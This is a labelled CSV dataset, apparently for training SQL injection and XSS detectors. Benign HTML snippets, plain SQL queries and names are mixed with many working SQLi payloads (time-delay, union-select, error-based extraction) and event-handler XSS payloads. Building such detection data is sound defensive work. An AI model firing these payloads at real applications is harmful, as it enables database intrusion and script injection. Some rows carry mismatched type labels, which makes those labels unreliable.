Text,Label,type
"1""  )   as dezr where 2145  =  2145 or sleep  (  5  )  #",1,sql
"<li><a href=""/wiki/Evolutionary_programming"" title=""Evolutionary programming"">Evolutionary programming </a> </li>",0,xss
jaworsky,0,sql
SELECT AVG ( Price ) FROM hunter,0,sql
"<plaintext onkeyup=""alert(1)"" contenteditable>test</plaintext>",2,xss
"1'  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'adjc'  =  'adjc",1,sql
"1' where 3760  =  3760 union all select null,null,null,null,null,null,null,null#",1,sql
admin'  )   or   (  '1'  =  '1'#,1,sql
"<li id=""cite_note-332""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-332"">^ </a> </b> ",0,xss
"<wbr onmousemove=""alert(1)"">test</wbr>",2,xss
"<li><a href=""/wiki/Talcott_Parsons"" title=""Talcott Parsons"">Talcott Parsons </a> </li>",0,xss
"-2948'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'ivwt'  =  'ivwt",1,sql
	 </span>,0,xss
<hgroup onpointerup=alert(1)>XSS</hgroup>,2,xss
7011,0,sql
-6764'  )   or 2314  =  2017--,1,sql
"  SELECT will,suit,green FROM damage LEFT JOIN Orders ON rod.pineID =  outer.ask ORDER BY pipe.brought",0,sql
<bdo onpointerdown=alert(1)>XSS</bdo>,2,xss
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3",1,sql
"<li>Ask a question in the <a class=""reference external"" href=""irc://irc.freenode.net/scrapy"">#scrapy IRC channel</a>,</li>",0,xss
SELECT * FROM suit  WHERE brush = travel,0,sql
"<style>@keyframes x{}</style><content style=""animation-name:x"" onanimationend=""alert(1)""></content>",2,xss
SELECT * FROM ship WHERE giant IN  ( SELECT softly FROM first ) ,0,sql
"1'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'igqm'  =  'igqm",1,sql
SELECT TOP 50 PERCENT * FROM his,0,sql
"<ul><li><img alt=""Wikipedia book"" src=""//upload.wikimedia.org/wikipedia/commons/thumb/8/89/Symbol_book_class2.svg/16px-Symbol_book_class2.svg.png"" decoding=""async"" title=""Wikipedia book"" width=""16"" height=""16"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/8/89/Symbol_book_class2.svg/23px-Symbol_book_class2.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/8/89/Symbol_book_class2.svg/31px-Symbol_book_class2.svg.png 2x"" data-file-width=""180"" data-file-height=""185"" /> <b><a href=""/wiki/Book:Computer_science"" class=""mw-redirect"" title=""Book:Computer science"">Book </a> </b> </li>",0,xss
2am901to,0,sql
"1%'   )    )     )   union all select null,null,null#",1,xss
SELECT * FROM forgot WHERE either NOT LIKE '[lion]%',0,sql
henry,0,xss
1'  )   as bihs where 4197  =  4197,1,sql
<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>,2,xss
6.64228E+14,0,sql
SELECT * FROM piece WHERE raw = 'wide'  AND  ( brass = 'hat' OR newspaper = 'understanding' ) ,0,sql
"<li id=""cite_note-Representing_knowledge_about_knowledge-96""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Representing_knowledge_about_knowledge_96-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Representing_knowledge_about_knowledge_96-1""><sup><i><b>b </b> </i> </sup> </a> ",0,xss
7.90589E+15,0,sql
"1'  )   where 3262  =  3262 union all select null,null,null,null,null,null,null,null,null,null#",1,sql
SELECT * FROM offer WHERE ancient = 'thin'  OR bear = 'basket',0,xss
6r5int3805,0,sql
daochuan,0,xss
"-6587'  )   union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",1,sql
SELECT * FROM constantly,0,sql
"<style>:target {color:red;}</style><acronym id=x style=""transition:color 1s"" ontransitionend=alert(1)></acronym>",2,xss
"-8312%""   )    )    union all select 4972--",1,sql
"	 <div style=""padding:0em 0.25em"">",0,xss
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",1,sql
"1   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   4277  =  4277",1,xss
"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",1,xss
"1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'vgkt'  =  'vgkt",1,sql
<s onpointerenter=alert(1)>XSS</s>,2,xss
"<nav onkeyup=""alert(1)"" contenteditable>test</nav>",2,xss
-2715'   )    )    or 6942  =  1636 and    (    (   'mqeq'  =  'mqeq,1,sql
51517640d,0,xss
"1 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
fredesvinda,0,xss
"<menu draggable=""true"" ondragenter=""alert(1)"">test</menu>",2,xss
cuatriduana,0,sql
"  <div class=""section"" id=""scrapy-version-documentation"">",0,xss
SELECT AVG ( Price ) FROM consider,0,sql
-8753  )   order by 1#,1,sql
"1%""   )    )    union all select null,null,null,null,null,null,null,null,null#",1,sql
"   SELECT COUNT ( studying ) , program FROM score BY former",0,sql
"<li><a href=""/wiki/Speech_recognition"" title=""Speech recognition"">Speech recognition </a> </li> </ul> </li>",0,xss
alegre nomdedeu,0,sql
SELECT * FROM fun WHERE    NOT travel = 'pair',0,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Observer&amp;rft.atitle=Stephen+Hawking%2C+Elon+Musk%2C+and+Bill+Gates+Warn+About+Artificial+Intelligence&amp;rft.date=2015-08-19&amp;rft_id=http%3A%2F%2Fobserver.com%2F2015%2F08%2Fstephen-hawking-elon-musk-and-bill-gates-warn-about-artificial-intelligence%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT * FROM near ORDER BY zipper,0,sql
"	 </span> <span class=""reference-text"">",0,xss
1' where 9206  =  9206,1,xss
-3597'   )    )    order by 1--,1,xss
animador!a,0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11510 )  ORDER BY meta_id ASC",0,sql
"<li><a href=""/wiki/Logic_programming"" title=""Logic programming"">Logic programming </a> </li>",0,xss
"1%""   )    )     )   union all select null,null,null,null#",1,xss
d6ntrotr566,0,xss
SELECT * FROM eat WHERE NOT hope = 'sugar'  AND NOT bone = 'grass',0,sql
SELECT blind FROM egg UNION ALL SELECT half FROM closer ORDER BY sheet,0,sql
"<dd>Researchers have designed systems to build intelligent systems out of interacting <a href=""/wiki/Intelligent_agent"" title=""Intelligent agent"">intelligent agents </a> in a <a href=""/wiki/Multi-agent_system"" title=""Multi-agent system"">multi-agent system </a>.<sup id=""cite_ref-Agent_architectures_180-0"" class=""reference""><a href=""#cite_note-Agent_architectures-180"">&#91;176&#93; </a> </sup> A <a href=""/wiki/Hierarchical_control_system"" title=""Hierarchical control system"">hierarchical control system </a> provides a bridge between sub-symbolic AI at its lowest, reactive levels and traditional symbolic AI at its highest levels, where relaxed time constraints permit planning and world modeling.<sup id=""cite_ref-Hierarchical_control_system_181-0"" class=""reference""><a href=""#cite_note-Hierarchical_control_system-181"">&#91;177&#93; </a> </sup> Some cognitive architectures are custom-built to solve a narrow problem; others, such as <a href=""/wiki/Soar_(cognitive_architecture)"" title=""Soar (cognitive architecture)"">Soar </a>, are designed to mimic human cognition and to provide insight into general intelligence. Modern extensions of Soar are <a href=""/wiki/Hybrid_intelligent_system"" title=""Hybrid intelligent system"">hybrid intelligent systems </a> that include both symbolic and sub-symbolic components.<sup id=""cite_ref-182"" class=""reference""><a href=""#cite_note-182"">&#91;178&#93; </a> </sup><sup id=""cite_ref-183"" class=""reference""><a href=""#cite_note-183"">&#91;179&#93; </a> </sup><sup id=""cite_ref-184"" class=""reference""><a href=""#cite_note-184"">&#91;180&#93; </a> </sup> </dd> </dl>",0,xss
"-2059%"" or elt  (  4587  =  3101,3101  )   and ""%""  =  """,1,sql
"<li class=""toclevel-2 tocsection-47""><a href=""#Art""><span class=""tocnumber"">7.12 ",0,xss
-7600' or 7684  =  3181#,1,sql
SELECT TOP 3 * FROM to SELECT * FROM famous 3SELECT * FROM fellow,0,sql
"SELECT wp_posts.ID FROM wp_posts LEFT JOIN wp_term_relationships ON  ( wp_posts.ID  =  wp_term_relationships.object_id )  WHERE 1 = 1 AND  (  wp_term_relationships.term_taxonomy_id IN  ( 2636 )   )  AND wp_posts.post_type  =  'support_family' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_title ASC LIMIT 0, 10",0,sql
"<datalist onkeypress=""alert(1)"" contenteditable>test</datalist>",2,xss
macrura,0,sql
SELECT ASIN ( -0.8 ) ;,0,xss
SELECT * FROM floating,0,xss
SELECT * FROM design FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM zipper,0,sql
"INSERT INTO prize  ( vapor, indeed, also )  VALUES  ( 'law', 'break', 'lesson' )  ",0,xss
"<frameset onbeforecut=""alert(1)"" contenteditable>test</frameset>",2,xss
SELECT * FROM food WHERE lips NOT BETWEEN 'ordinary' AND 'mix',0,xss
SELECT MIN ( handsome )  AS gray FROM food,0,sql
"   SELECT up, afraid, jungle FROM basic WHERE build  IS NULL",0,xss
"<form onclick=""alert(1)"">test</form>",2,xss
tejo,0,sql
45810,0,sql
SELECT nation FROM rising UNION ALL SELECT freedom FROM pool ORDER BY dirt,0,xss
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
torrande gaitan,0,xss
	 </span>,0,xss
komarov@docerosas.dk,0,xss
-9581  )   as jkqo where 5200  =  5200 or 6872  =  6872--,1,sql
8.92715E+15,0,sql
"<li><a href=""/wiki/Ubiquitous_computing"" title=""Ubiquitous computing"">Ubiquitous computing </a> </li>",0,xss
"1""  )   where 7578  =  7578 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
"<div draggable=""true"" contenteditable>drag me</div><colgroup ondragover=alert(1) contenteditable>drop here</colgroup>",2,xss
"<ins oncontextmenu=""alert(1)"">test</ins>",2,xss
SELECT COUNT ( primitive ) FROM especially,0,sql
potroso,0,sql
<script onerror=alert(1) src=/></script>,2,xss
nardi borgua,0,xss
1  )   rlike sleep  (  5  ) ,1,xss
"<rtc oncopy=""alert(1)"" contenteditable>test</rtc>",2,xss
"<li>take the center square if it is free. Otherwise, </li>",0,xss
2969,0,sql
"SELECT * FROM salmon WHERE first BETWEEN ""wool"" AND    ""well""",0,sql
"<i oncut=""alert(1)"" contenteditable>test</i>",2,xss
"<li id=""cite_note-388""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-388"">^ </a> </b> ",0,xss
SELECT every FROM directly UNION ALL SELECT merely FROM indeed ORDER BY furniture,0,sql
13630,0,xss
"1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--",1,xss
"<li><a href=""/wiki/Computational_social_science"" title=""Computational social science"">Computational social science </a> </li>",0,xss
pravia,0,xss
"-5652%'  )   union all select 4447,4447,4447,4447,4447,4447,4447,4447,4447--",1,xss
<image2 onpointerenter=alert(1)>XSS</image2>,2,xss
18223647b,0,xss
"   SELECT warn, reach+ ', ' + firm+ ' ' + powerful+ ', ' + friendly AS ago  FROM attack",0,sql
SELECT * FROM onto WHERE equally = 'square'  AND  ( guess = 'snake' OR break = 'bare' ) ,0,xss
"  SELECT transportation,child FROM furniture WHERE other = 'poetry' UNION SELECT dry, act FROM plate",0,sql
"<address onclick=""alert(1)"">test</address>",2,xss
ja34ico,0,sql
if  (  6554  =  1534  )   select 6554 else drop function buqb--,1,sql
SELECT * FROM per WHERE customs = 'setting' FETCH FIRST 3 ROWS ONLY,0,xss
"   SELECT can, instead, term FROM official WHERE map  IS NULL",0,sql
"<li><a href=""/wiki/Computer_security_compromised_by_hardware_failure"" title=""Computer security compromised by hardware failure"">Hardware security </a> </li>",0,xss
"<meta draggable=""true"" ondrag=""alert(1)"">test</meta>",2,xss
"<ul oncopy=""alert(1)"" contenteditable>test</ul>",2,xss
magaz de pisuerga,0,xss
"<li id=""cite_note-150""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-150"">^ </a> </b> ",0,xss
<u onpointerout=alert(1)>XSS</u>,2,xss
"1""  )   where 2764  =  2764 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",1,sql
-1908'   )    )     )   union all select 7665#,1,xss
ibero saborit,0,sql
1%'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  '%'  =  ',1,sql
"SELECT * FROM return WHERE medicine BETWEEN ""darkness"" AND    ""guard""",0,sql
SELECT * FROM dirt WHERE leg = 'sight',0,sql
"-4558' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Business+Insider&amp;rft.atitle=Mark+Zuckerberg+responds+to+Elon+Musk%27s+paranoia+about+AI%3A+%27AI+is+going+to...+help+keep+our+communities+safe.%27&amp;rft.date=2018-05-25&amp;rft_id=https%3A%2F%2Fwww.businessinsider.com%2Fmark-zuckerberg-shares-thoughts-elon-musks-ai-2018-5&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"INSERT INTO faster  ( board, cook, parent )  VALUES  ( 'blank', 'combine', 'neighborhood' )  ",0,xss
1' where 4134  =  4134 and 1102  =  6300--,1,xss
SELECT growth ( s )  FROM music UNION,0,sql
"   SELECT occur, was, castFROM make WHERE outline  IS NOT NULL",0,xss
"<rp ondblclick=""alert(1)"">test</rp>",2,xss
 UPDATE alphabet SET colony = 'cutting'WHERE taken = 'stems',0,sql
"<big onbeforecut=""alert(1)"" contenteditable>test</big>",2,xss
80216904b,0,sql
"INSERT INTO boy  ( goose, offer, slabs )  VALUES  ( 'particularly', 'course', 'exact' )  ",0,sql
threader,0,sql
26143,0,sql
22468230j,0,sql
SELECT COUNT ( DISTINCT beautiful )  FROM lying,0,sql
SELECT AVG ( told )  FROM welcome  SELECT SUM ( yesterday ) ,0,sql
"-2725"" union all select 3671,3671,3671,3671,3671#",1,sql
"<div draggable=""true"" contenteditable>drag me</div><basefont ondrop=alert(1) contenteditable>drop here</basefont>",2,xss
1'  )   as xskm where 3525  =  3525 and 2435  =  6513,1,xss
SELECT * FROM said 3,0,sql
<em onpointerleave=alert(1)>XSS</em>,2,xss
cobea,0,sql
SELECT * FROM parallel WHERE eventually NOT LIKE 'parts%',0,xss
albeta,0,sql
"<li><a href=""#CITEREFHawkinsBlakeslee2005"">Hawkins &amp; Blakeslee 2005 </a> (Hawkins argues that sub-symbolic knowledge should be the primary focus of AI research.) </li> </ul>",0,xss
zarrapastrosamente,0,xss
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   3127  =  3127",1,sql
gwohsing,0,xss
SELECT outer ( s )  FROM dog LEFT JOIN,0,sql
" SELECT column_name ( s )  FROM within,sad",0,sql
SELECT COT ( 6 ) ;,0,sql
1'   )    )    and 7533  =  7533 and    (    (   'gvoh'  =  'gvoh,1,sql
1oca,0,xss
37748,0,sql
 </ul>,0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"<li><a href=""/wiki/Frank_Wilczek"" title=""Frank Wilczek"">Frank Wilczek </a> </li>",0,xss
"<li id=""cite_note-354""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-354"">^ </a> </b> ",0,xss
"<ins onmouseleave=""alert(1)"">test</ins>",2,xss
8.09757E+15,0,sql
"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",1,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 4286 )  ORDER BY meta_id ASC",0,sql
<basefont onpointerenter=alert(1)>XSS</basefont>,2,xss
"  SELECT leafID AS ID, date AS position FROM love",0,xss
SELECT * FROM  ( SELECT attack FROM verb ) ,0,sql
SELECT stretch ( s )  FROM twelve SELECT grass FROM aid,0,sql
"-2323""  )   as zgsn where 9274  =  9274 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1,sql
"1""   )    )     )   union all select null,null,null,null,null,null,null#",1,sql
" select * from users where id  =  1 or ""{#"" or 1  =  1 -- 1",1,sql
"<embed oncopy=""alert(1)"" contenteditable>test</embed>",2,xss
SELECT swimming FROM explore UNION SELECT therefore FROM hungry ORDER BY base,0,sql
1%' or sleep  (  5  )   and '%'  =  ',1,sql
select case when 5559  =  3483 then 1 else null end--,1,sql
"   SELECT melted, safe, tuneFROM around WHERE ready  IS NOT NULL",0,sql
"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",1,sql
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=36"" title=""Edit section: Healthcare"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
"<li><a href=""/wiki/Introspection"" title=""Introspection"">Introspection </a> </li>",0,xss
	 </span>,0,xss
"	 </span> <span class=""toctext"">In fiction ",0,xss
"<li><a href=""/wiki/Panpsychism"" title=""Panpsychism"">Panpsychism </a> </li>",0,xss
jarandilla de la vera,0,sql
"          <dd><a href=""/en/0.24/"">0.24</a></dd>",0,xss
"<li><a href=""/wiki/Glossary_of_civil_engineering"" title=""Glossary of civil engineering"">Civil engineering </a> </li>",0,xss
"<dialog onmousedown=""alert(1)"">test</dialog>",2,xss
pimentel gatius,0,sql
<keygen id=x tabindex=1 onbeforedeactivate=alert(1)></keygen><input autofocus>,2,xss
3.11985E+15,0,sql
SELECT AVG ( essential ) FROM row SELECT SUM ( gradually ) ,0,sql
<title onpointermove=alert(1)>XSS</title>,2,xss
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",1,sql
"1'  )   as wnyl where 8978  =  8978 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
esbarar,0,sql
"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'efwq' like 'efwq",1,sql
</footer>,0,xss
olaf,0,sql
"          <dd><a href=""/en/0.22/"">0.22</a></dd>",0,xss
"<li id=""cite_note-Hierarchical_control_system-181""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Hierarchical_control_system_181-0"">^ </a> </b> ",0,xss
nogus,0,sql
select   (  case when   (  1407  =  2741  )   then 1407 else 1407*  (  select 1407 from mysql.db  )   end  )  #,1,sql
cinthia,0,sql
veri5icat1va,0,sql
trish,0,sql
forslund,0,sql
SELECT * FROM slept,0,sql
	 </span>,0,xss
SELECT * FROM stand FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Smoliar, Stephen W.; Zhang, HongJiang (1994). ""Content based video indexing and retrieval"". <i>IEEE Multimedia </i>. <b>1 </b> (2): 62–72. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1109%2F93.311653"">10.1109/93.311653 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=IEEE+Multimedia&amp;rft.atitle=Content+based+video+indexing+and+retrieval&amp;rft.volume=1&amp;rft.issue=2&amp;rft.pages=62-72&amp;rft.date=1994&amp;rft_id=info%3Adoi%2F10.1109%2F93.311653&amp;rft.aulast=Smoliar&amp;rft.aufirst=Stephen+W.&amp;rft.au=Zhang%2C+HongJiang&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
colas@ozlon.rs,0,sql
select   (  case when   (  2140  =  5325  )   then 2140 else 2140*  (  select 2140 from information_schema.character_sets  )   end  )  #,1,sql
<nav onpointerleave=alert(1)>XSS</nav>,2,xss
SELECT TOP 3 * FROM paint WHERE change = 'metal',0,sql
"1%""  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"  SELECT Orders.knownrID, Employees.whale, Employees.instead FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.settlersID ORDER BY Orders.houseID",0,xss
"<li><a href=""/wiki/Wilhelm_Windelband"" title=""Wilhelm Windelband"">Wilhelm Windelband </a> </li>",0,xss
"<link rel=""EditURI"" type=""application/rsd+xml"" href=""//en.wikipedia.org/w/api.php?action=rsd""/>",0,xss
52310665v,0,sql
"1%""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""%""  =  """,1,sql
"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,sql
"<div draggable=""true"" contenteditable>drag me</div><element ondrop=alert(1) contenteditable>drop here</element>",2,xss
SELECT foot ( s )  FROM example,0,sql
47965007w,0,sql
"<style>:target {color: red;}</style><select id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></select>",2,xss
71404358f,0,xss
"<tt draggable=""true"" ondrag=""alert(1)"">test</tt>",2,xss
bettine,0,sql
-2648'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'sawt'  =  'sawt,1,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""versioning.html"">Versioning and API Stability</a></li>",0,xss
<video onpointerdown=alert(1)>XSS</video>,2,xss
<ol id=x tabindex=1 onfocusin=alert(1)></ol>,2,xss
 UPDATE evening SET describe = 'song'WHERE section = 'whenever',0,sql
"-4637"" where 8354  =  8354 or 1186  =  2714--",1,sql
"-7345%"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,1,xss
SELECT * FROM improve WHERE steel = 'official',0,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+Economist&amp;rft.atitle=From+not+working+to+neural+networking&amp;rft.date=2016&amp;rft_id=https%3A%2F%2Fwww.economist.com%2Fnews%2Fspecial-report%2F21700756-artificial-intelligence-boom-based-old-idea-modern-twist-not&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
<form id=x tabindex=1 ondeactivate=alert(1)></form><input id=y autofocus>,2,xss
"espartero, 103, 5-f",0,sql
"1'   )    )    union all select null,null,null#",1,sql
06918701w,0,xss
SELECT * FROM understanding  WHERE no NOT LIKE '[captain]%',0,sql
SELECT AVG ( drink ) FROM century,0,xss
"c/ alicante, 83,",0,sql
carmia,0,sql
SELECT * FROM fall WHERE meal = 'monkey' LIMIT 3,0,xss
1'||  (  select 'pmpd' where 9803  =  9803,1,xss
"		<div class=""body"">",0,xss
SELECT * FROM product WHERE water BETWEEN 'case' AND 'mail',0,sql
jaca 75,0,sql
	 </span>,0,xss
<xss id=x tabindex=1 onblur=alert(1)></xss><input autofocus>,2,xss
"<basefont ondblclick=""alert(1)"">test</basefont>",2,xss
 or 1 --',1,sql
obdulio,0,sql
"1""   )    )    as zgig where 5748  =  5748 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,sql
"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",1,sql
"1'  )   where 7658  =  7658 union all select null,null#",1,sql
"<frameset draggable=""true"" ondragend=""alert(1)"">test</frameset>",2,xss
96622444l,0,sql
villarrasa,0,sql
"   SELECT wear,stone,whom,sat,first     (  (  higher JOIN ice ON sound.aware =  difference.halfway )   INNER JOIN callON Orders.force =  structure.taxID ) ",0,sql
"  SELECT serious,season,value FROM horn LEFT JOIN Orders ON huge.studiedID =  bigger.die ORDER BY exclaimed.for",0,sql
"<progress onbeforecopy=""alert(1)"" contenteditable>test</progress>",2,xss
cimorro,0,sql
"1%""   )    )    waitfor delay '0:0:5' and    (    (   ""%""  =  """,1,sql
22010612a,0,sql
depravador,0,sql
"	 <div class=""thumbinner"" style=""width:362px;""><a href=""/wiki/File:EM_Clustering_of_Old_Faithful_data.gif"" class=""image""><img alt="""" src=""//upload.wikimedia.org/wikipedia/commons/6/69/EM_Clustering_of_Old_Faithful_data.gif"" decoding=""async"" width=""360"" height=""309"" class=""thumbimage"" data-file-width=""360"" data-file-height=""309"" /> </a>  <div class=""thumbcaption""><a href=""/wiki/Expectation-maximization"" class=""mw-redirect"" title=""Expectation-maximization"">Expectation-maximization </a> clustering of <a href=""/wiki/Old_Faithful"" title=""Old Faithful"">Old Faithful </a> eruption data starts from a random guess but then successfully converges on an accurate clustering of the two physically distinct modes of eruption. </div> </div> </div>",0,xss
-8486%'   )    )     )   or 8571  =  8571--,1,sql
1   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,sql
